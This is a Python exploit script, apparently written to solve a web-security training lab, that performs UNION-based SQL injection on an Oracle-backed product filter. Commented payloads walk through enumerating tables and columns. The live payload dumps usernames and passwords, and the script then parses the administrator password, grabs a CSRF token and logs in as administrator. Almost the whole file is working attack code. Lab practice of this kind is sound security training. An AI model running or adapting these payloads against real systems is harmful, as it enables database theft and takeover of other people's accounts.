# SQL injection attack, listing the database contents on Oracle

import requests
import re

url = "https://0a9a001e04592defc004237b002200c7.web-security-academy.net/"
cookies = dict(session="1cFNgmhZessU3e9PzkYadusjZ2xKvQn0")

# PAYLOAD = "' UNION SELECT 'def','abc' FROM dual-- -"
# PAYLOAD = "' UNION SELECT table_name, 'def' FROM all_tables -- -"
# print(tables) -> find user table = USERS_BMDPIR
# PAYLOAD = "' UNION SELECT column_name, 'def' FROM all_tab_columns WHERE table_name = 'USERS_BMDPIR'-- -"
# find column name = ['PASSWORD_MTWMYM', 'USERNAME_QFKKUS']
PAYLOAD = "' UNION SELECT PASSWORD_MTWMYM || '~' || USERNAME_QFKKUS, NULL FROM USERS_BMDPIR-- -"
params = dict(category=PAYLOAD)

session = requests.Session()

r1 = session.get(url + 'filter', params=params, cookies=cookies)

# tables = re.findall(r'<th>(.*)</th>', r1.text)
pwd = re.findall(r'<th>(.*)~administrator', r1.text)
# print(pwds)

r2 = session.get(url + 'login', cookies=cookies)
csrf = re.findall(r'csrf" value="(.*)">', r2.text)

data = {
	"username": "administrator",
	"password": pwd[0],
	"csrf": csrf[0]
}

session.post(url + 'login', data=data, cookies=cookies)

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())
# proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080' }